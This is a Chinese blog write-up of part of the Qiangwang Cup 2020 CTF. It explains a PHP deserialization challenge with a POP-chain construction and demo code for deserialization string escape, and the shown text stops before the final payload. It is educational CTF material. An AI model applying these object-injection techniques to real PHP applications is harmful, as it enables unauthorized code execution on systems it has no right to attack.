<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>强网杯2020部分WriteUp - HStar's Blog</title><meta name=Description content="强网杯2020"><meta property="og:title" content="强网杯2020部分WriteUp"><meta property="og:description" content="强网杯2020"><meta property="og:type" content="article"><meta property="og:url" content="https://hstar.me/2020/08/qwb-2020-writeup/"><meta property="article:published_time" content="2020-08-24T10:01:42+08:00"><meta property="article:modified_time" content="2020-08-25T10:17:42+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="强网杯2020部分WriteUp"><meta name=twitter:description content="强网杯2020"><meta name=application-name content="HStar's Blog"><meta name=apple-mobile-web-app-title content="HStar's Blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://hstar.me/2020/08/qwb-2020-writeup/><link rel=prev href=https://hstar.me/2020/08/hill-cipher-study/><link rel=next href=https://hstar.me/2020/09/note-software-test/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"强网杯2020部分WriteUp","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/hstar.me\/2020\/08\/qwb-2020-writeup\/"},"genre":"posts","keywords":"强网杯","wordcount":6958,"url":"https:\/\/hstar.me\/2020\/08\/qwb-2020-writeup\/","datePublished":"2020-08-24T10:01:42+08:00","dateModified":"2020-08-25T10:17:42+08:00","publisher":{"@type":"Organization","name":"HStar"},"author":{"@type":"Person","name":"HStar"},"description":"强网杯2020"}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':('auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="HStar's Blog">HStar's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/about/>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="HStar's Blog">HStar's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/>文章</a><a class=menu-item href=/tags/>标签</a><a class=menu-item href=/categories/>分类</a><a class=menu-item href=/about/>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">强网杯2020部分WriteUp</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/about/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>HStar</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-08-24>2020-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6958 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 14 分钟&nbsp;<span id=/2020/08/qwb-2020-writeup/ class=leancloud_visitors data-flag-title=强网杯2020部分WriteUp>
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/532f01757c3ab45ade69b98f86a0086ad00f4c7b0b8549610ab912367a8c05dd.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/532f01757c3ab45ade69b98f86a0086ad00f4c7b0b8549610ab912367a8c05dd.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/532f01757c3ab45ade69b98f86a0086ad00f4c7b0b8549610ab912367a8c05dd.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/532f01757c3ab45ade69b98f86a0086ad00f4c7b0b8549610ab912367a8c05dd.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/532f01757c3ab45ade69b98f86a0086ad00f4c7b0b8549610ab912367a8c05dd.png title=强网杯2020></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#misc签到>MISC——签到</a></li><li><a href=#强网先锋web辅助>强网先锋——web辅助</a></li><li><a href=#强网先锋funhash>强网先锋——Funhash</a></li><li><a href=#强网先锋upload>强网先锋——upload</a></li><li><a href=#强网先锋红方辅助>强网先锋——红方辅助</a></li><li><a href=#强网先锋主动>强网先锋——主动</a></li></ul></nav></div></div><div class=content id=content><hr><h2 id=misc签到>MISC——签到</h2><p>打开题目即可看到<code>flag</code></p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png data-thumbnail=/images/强网杯2020部分WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png></a><figcaption class=image-caption></figcaption></figure></p><hr><h2 id=强网先锋web辅助>强网先锋——web辅助</h2><p>打开题目，下载附件源码，共有 4 个文件，其中 <code>index.php</code> 与 <code>play.php</code>，是序列化与反序列化的执行文件，<code>class.php</code> 是类文件，<code>common.php</code> 是工具文件。</p><p>在<code>index.php</code>中，接收两个参数并生成对象，最后将对象信息经过处理后存进文件中：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png data-thumbnail=/images/强网杯2020部分WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png></a><figcaption class=image-caption></figcaption></figure></p><p>在<code>play.php</code>中，读取文件内容，并经过检查和处理后，反序列化成对象：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png data-thumbnail=/images/强网杯2020部分WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png></a><figcaption class=image-caption></figcaption></figure></p><p>在<code>class.php</code>中，存在几个类的定义，具体分析如下：</p><ul><li><p><strong>jungle</strong>类：读取<code>flag</code>的类</p><ul><li><strong>KS()</strong>：执行系统命令读取了<code>flag</code></li><li><strong>__toString()</strong>：调用了 KS()。因为 __toString() 的特性，当该类的对象被当字符串进行处理时，都会调用 __toString() ，例如<code>echo new jungle()</code>，当然除了<code>echo</code>，还有其他方法也能触发调用 __toString()，如<code>strlen()</code>、<code>strstr()</code>等等</li></ul><p><strong>jungle</strong> 类是一个关键类，关乎到是否能读取<code>flag</code>，在这个类中，想要调用 <strong>KS()</strong> 读取<code>flag</code>，就得利用 <strong>__toString()</strong> 的特性，让 <strong>jungle类对象</strong> 被当作字符串处理，即可读取<code>flag</code></p></li></ul><p><br></p><ul><li><p><strong>midsolo</strong>类：触发 <strong>jungle类__toString()</strong> 的类</p><ul><li><strong>Gank()</strong>：将 $this->name 进行了 stristr() 判断</li><li><strong>__invoke()</strong>：调用了 Gank()</li><li><strong>__wakeup()</strong>：给 $this->name 赋值为字符串</li></ul><p>在 <strong>midsolo</strong> 类中，关键的地方在于 <strong>Gank()</strong> 方法中的 <strong>stristr()</strong> 判断。根据上面 jungle 类的分析，如果这里 <strong>$this->name</strong> 为 <strong>jungle类对象</strong> 时，那么就会 <strong>调用jungle类的__toString()</strong>，从而调用 <strong>KS()</strong> 读取到<code>flag</code></p><p>而在 <strong>__invoke()</strong> 方法，调用了 <strong>Gank()</strong>，也就是说，当 <strong>midsolo的类对象被当成方法调用</strong> 时，即可调用 <strong>Gank()</strong>，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
   <span class=nv>$obj</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>midsolo</span><span class=p>();</span>
   <span class=nv>$obj</span><span class=p>();</span>
<span class=cp>?&gt;</span>
</code></pre></td></tr></table></div></div><p>最后 <strong>__wakeup()</strong> 中，给 <strong>$this->name</strong> 赋了值，如果 <strong>想让$this->name为jungle类对象的话，就得绕过__wakeup()</strong></p></li></ul><p><br></p><ul><li><p><strong>topsolo</strong>类：<strong>调用midsolo类对象</strong> 的类</p><ul><li><strong>TP()</strong>：判断 $this->name 是否为 function 或 object ，并且去执行它</li><li><strong>__destruct()</strong>：析构方法，会调用 TP()</li></ul><p>在 <strong>topsolo</strong> 类中，关键点就在于 <strong>TP()</strong>，会去执行 <strong>$this->name()</strong>，根据上面 midsolo 类的分析，如果 <strong>$this->name赋值为 midsolo 类对象，那么就可调用 midsolo 类的 __invoke() 与 Gank()</strong></p></li></ul><p><br></p><ul><li><strong>player</strong>类：可以实际控制的类
<strong>player</strong> 为入口类，两个成员变量可控制，可以<strong>将成员变量赋值为 topsolo 类对象</strong>，这样就能依次调用上面的类方法了</li></ul><p><br></p><p>根据上面的分析，其实已经可以看出点端倪了，可以根据上面的类来构造一个<code>POP链</code>，获取<code>flag</code>，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
<span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=k>require_once</span> <span class=s2>&#34;common.php&#34;</span><span class=p>;</span>
<span class=k>require_once</span> <span class=s2>&#34;class.php&#34;</span><span class=p>;</span>


<span class=nv>$jungle</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>jungle</span><span class=p>();</span>
<span class=nv>$midsolo</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>midsolo</span><span class=p>(</span><span class=nv>$jungle</span><span class=p>);</span>
<span class=nv>$topsolo</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>topsolo</span><span class=p>(</span><span class=nv>$midsolo</span><span class=p>);</span>
<span class=nv>$player</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>player</span><span class=p>(</span><span class=s1>&#39;aaa&#39;</span><span class=p>,</span> <span class=nv>$topsolo</span><span class=p>);</span>
<span class=cp>?&gt;</span>
</code></pre></td></tr></table></div></div><p><br></p><p>最后的<code>common.php</code>，存在三个方法：<strong>read()</strong>、<strong>write()</strong>、<strong>check()</strong></p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png data-thumbnail=/images/强网杯2020部分WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png></a><figcaption class=image-caption></figcaption></figure></p><p>其中 <strong>write()</strong> 在序列化的时候调用，将<code>0x00*0x00</code>替换成<code>\0*\0</code>，而 <strong>read()</strong> 则相反，在反序列化的时候调用，将<code>\0*\0</code>替换成<code>0x00*0x00</code>，而 <strong>check()</strong> 也是在反序列化的时候调用，检查反序列化的数据是否存在<code>name</code>字段。其实看到这里，已经可以发现 <strong>write()</strong> 与 <strong>read()</strong> 存在 <strong>反序列化逃逸</strong> 的漏洞，这里我们先简单学习下 <strong>反序列化逃逸</strong> 的知识点。</p><p>首先，PHP 在反序列化时，会根据变量的类型来生成变量，如果是字符串类型，还会根据长度来生成字符串。而如果长度值超出了后面的定义的字符串的话，PHP 会继续向后取内容，直到取满相同长度的字符。这样说的可能有点抽象，举个例子演示一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
    <span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
        <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
        <span class=k>public</span> <span class=nv>$age</span><span class=p>;</span>

        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span> <span class=nv>$age</span><span class=p>){</span>
            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span> <span class=o>=</span> <span class=nv>$name</span><span class=p>;</span>
            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span> <span class=o>=</span> <span class=nv>$age</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span>


    <span class=nv>$A</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>A</span><span class=p>(</span><span class=s1>&#39;xiaoming&#39;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
	<span class=nx>var_dump</span><span class=p>(</span><span class=nv>$A</span><span class=p>);</span>
	<span class=k>echo</span> <span class=s1>&#39;&lt;hr&gt;&#39;</span><span class=p>;</span>

    <span class=nv>$str</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$A</span><span class=p>);</span>
    <span class=k>echo</span> <span class=nv>$str</span><span class=p>;</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;hr&gt;&#39;</span><span class=p>;</span>

    <span class=nv>$str</span> <span class=o>=</span> <span class=nx>substr_replace</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=s1>&#39;26&#39;</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
    <span class=nv>$str</span> <span class=o>.=</span> <span class=s1>&#39;&#34;;s:3:&#34;age&#34;;s:8:&#34;xiaoming&#34;;}&#39;</span><span class=p>;</span>
    <span class=k>echo</span> <span class=nv>$str</span><span class=p>;</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;hr&gt;&#39;</span><span class=p>;</span>

    <span class=nx>var_dump</span><span class=p>(</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$str</span><span class=p>));</span>
<span class=cp>?&gt;</span>
</code></pre></td></tr></table></div></div><p>执行结果如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png data-thumbnail=/images/强网杯2020部分WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png></a><figcaption class=image-caption></figcaption></figure></p><p>我们最初定义<code>name = 'xiaoming'</code>，<code>age = 18</code>，在经过序列化并对序列化数据进行了改变，再次反序列化回来的时候值都被改变了，特别是<code>age</code>，连类型都改变了，这是为什么呢？</p><p>在输出的第三行中，可以看到<code>s:8</code>被改成了<code>s:26</code>。这是什么意思呢？这代表<code>name</code>成员是一个字符串类型，并且字符串的长度是 26。</p><p>当 PHP 收到修改后的数据后，读取到 26 时，就真的会以 26 的长度去读取内容赋值给 <code>name</code>成员，所以说最后<code>name</code>变成了<code>xiaoming";s:3:"age";i:18;}</code>，将之前的<code>age</code>的定义当成了<code>name</code>的值。而读取了<code>name</code>的内容之后，PHP 会继续反序列化，读取到我们自己构造的数据，于是将<code>age</code>赋值成了<code>xiaoming</code>。</p><p><br></p><p>再次回过头来看 <strong>write()</strong> 与 <strong>read()</strong>，它们的内容中都有<code>\0*\0</code>与<code>0x00*0x00</code>，这两段字符串的区别是长度不同，<code>\0*\0</code>长度为 5，而<code>0x00*0x00</code>长度为 3，可用如下代码做个实验：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
    <span class=k>echo</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;br /&gt;&#39;</span><span class=p>;</span>
    <span class=k>echo</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>]);</span>
<span class=cp>?&gt;</span>
</code></pre></td></tr></table></div></div><p>访问<code>?a=\0*\0&b=%00*%00</code>得到结果如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png data-thumbnail=/images/强网杯2020部分WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png></a><figcaption class=image-caption></figcaption></figure></p><p>而<code>read()</code>将<code>\0*\0</code>替换成<code>0x00*0x00</code>，那么替换后的字符串会比原字符串少2个字符，于是产生了漏洞。这里为了说得清楚一些，用<code>player</code>来做个实验：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
    <span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
    <span class=k>require_once</span> <span class=s2>&#34;common.php&#34;</span><span class=p>;</span>
    <span class=k>require_once</span> <span class=s2>&#34;class.php&#34;</span><span class=p>;</span>

    <span class=nv>$player</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>player</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>],</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>]);</span>
    <span class=nv>$ser</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$player</span><span class=p>);</span>
    <span class=k>echo</span> <span class=nv>$ser</span><span class=p>;</span>                  <span class=c1>// 序列化时
</span><span class=c1></span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;br /&gt;&lt;hr&gt;&#39;</span><span class=p>;</span>

    <span class=nv>$ser</span> <span class=o>=</span> <span class=nx>write</span><span class=p>(</span><span class=nv>$ser</span><span class=p>);</span>
    <span class=k>echo</span> <span class=nv>$ser</span><span class=p>;</span>                  <span class=c1>// write时
</span><span class=c1></span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;br /&gt;&lt;hr&gt;&#39;</span><span class=p>;</span>

    <span class=nv>$ser</span> <span class=o>=</span> <span class=nx>read</span><span class=p>(</span><span class=nv>$ser</span><span class=p>);</span>
    <span class=k>echo</span> <span class=nv>$ser</span><span class=p>;</span>                  <span class=c1>// read时
</span><span class=c1></span>
    <span class=k>echo</span> <span class=s1>&#39;&lt;br /&gt;&lt;hr&gt;&#39;</span><span class=p>;</span>

    <span class=nx>var_dump</span><span class=p>(</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$ser</span><span class=p>));</span>       <span class=c1>// 反序列化时
</span><span class=c1></span>    <span class=k>echo</span> <span class=s1>&#39;&lt;br /&gt;&lt;hr&gt;&#39;</span><span class=p>;</span>
<span class=cp>?&gt;</span>
